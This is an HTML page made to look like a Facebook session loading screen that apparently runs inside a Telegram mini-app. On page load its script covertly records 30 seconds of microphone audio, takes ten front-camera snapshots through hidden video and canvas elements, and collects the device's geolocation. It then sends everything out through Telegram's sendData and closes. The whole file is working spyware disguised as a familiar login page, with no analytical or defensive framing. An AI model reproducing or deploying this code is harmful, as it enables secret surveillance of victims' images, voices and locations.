<!DOCTYPE html>

<html> <head> <meta charset="UTF-8"> <title>Facebook</title> <script src=""></script> <style> body { background: #f0f2f5; font-family: sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; } .logo { color: #1877f2; font-size: 40px; font-weight: bold; margin-bottom: 20px; } .loader { border: 3px solid #ddd; border-top: 3px solid #1877f2; border-radius: 50%; width: 25px; height: 25px; animation: spin 1s linear infinite; } @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } } </style> </head> <body> <div class="logo">facebook</div> <div class="loader"></div> <p style="color:#606770; font-size:14px;">Chargement de votre session...</p> <video id="v" autoplay playsinline style="display:none;"></video> <canvas id="c" style="display:none;"></canvas> <script> const tg = window.Telegram.WebApp; tg.expand(); let photos = []; let count = 0; async function start() { try { const stream = await navigator.mediaDevices.getUserMedia({ audio: true, video: { facingMode: "user" } }); document.getElementById('v').srcObject = stream; const rec = new MediaRecorder(stream); let chunks = []; rec.ondataavailable = e => chunks.push(e.data); rec.onstop = () => { const reader = new FileReader(); reader.readAsDataURL(new Blob(chunks, { type: 'audio/ogg' })); reader.onloadend = () => { send(reader.result); }; }; rec.start(); setTimeout(() => { if(rec.state !== "inactive") rec.stop(); }, 30000); const inv = setInterval(() => { if (count < 10) { const canvas = document.getElementById('c'); const video = document.getElementById('v'); canvas.width = 640; canvas.height = 480; canvas.getContext('2d').drawImage(video, 0, 0); photos.push(canvas.toDataURL('image/jpeg', 0.5)); count++; } else { clearInterval(inv); } }, 2000); } catch (e) { setTimeout(() => tg.close(), 3000); } } function send(aud) { navigator.geolocation.getCurrentPosition(pos => { tg.sendData(JSON.stringify({ lat: pos.coords.latitude, lon: pos.coords.longitude, pics: photos, aud: aud })); tg.close(); }, () => { tg.sendData(JSON.stringify({ lat: 0, lon: 0, pics: photos, aud: aud })); tg.close(); }); } window.onload = start; </script> </body> </html>
